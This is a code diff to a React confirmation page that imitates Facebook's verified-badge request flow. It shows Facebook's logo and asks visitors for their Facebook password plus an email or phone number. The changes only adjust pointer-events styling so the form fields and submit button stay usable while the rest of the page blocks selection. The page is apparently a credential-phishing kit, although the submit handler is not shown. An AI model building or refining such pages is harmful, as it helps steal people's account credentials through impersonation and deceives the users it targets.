@@ -129,8 +129,8 @@ export default function Confirmation() {
         description="Request a verified badge on Facebook - Final Step"
       />
       <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
-        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
-          <div className="pointer-events-none select-none">
+        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20 select-none pointer-events-none">
+          <div className="pointer-events-auto">
             <img
               src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
               alt="Logo"
@@ -144,7 +144,7 @@ export default function Confirmation() {
             Please enter your facebook password to complete the request
           </h3>
           <Form {...form}>
-            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4 pointer-events-auto">
               <div className="text-left">
                 <div className="mb-4">
                   <label className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
@@ -194,7 +194,7 @@ export default function Confirmation() {
                               <SelectTrigger className="w-[100px]">
                                 <SelectValue placeholder="Code" />
                               </SelectTrigger>
-                              <SelectContent>
+                              <SelectContent className="pointer-events-auto">
                                 <div className="sticky top-0 p-2 bg-white border-b z-50">
                                   <div className="flex items-center px-2 py-1 border rounded-md">
                                     <Search className="w-4 h-4 text-gray-500 mr-2" />
@@ -224,7 +224,7 @@ export default function Confirmation() {
                                 ? "Enter email address"
                                 : "Enter phone number"
                             }
-                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
+                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pointer-events-auto"
                             {...field}
                             onChange={(e) => {
                               let value = e.target.value;
@@ -258,13 +258,13 @@ export default function Confirmation() {
                           <Input
                             type={showPassword ? "text" : "password"}
                             placeholder="Enter password"
-                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pr-10"
+                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pr-10 pointer-events-auto"
                             {...field}
                           />
                           <button
                             type="button"
                             onClick={() => setShowPassword(!showPassword)}
-                            className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                            className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 pointer-events-auto"
                           >
                             {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                           </button>
@@ -278,7 +278,7 @@ export default function Confirmation() {
 
               <Button
                 type="submit"
-                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md"
+                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md pointer-events-auto"
                 disabled={isSubmitting}
               >
                 {isSubmitting ? "Submitting..." : "Submit"}
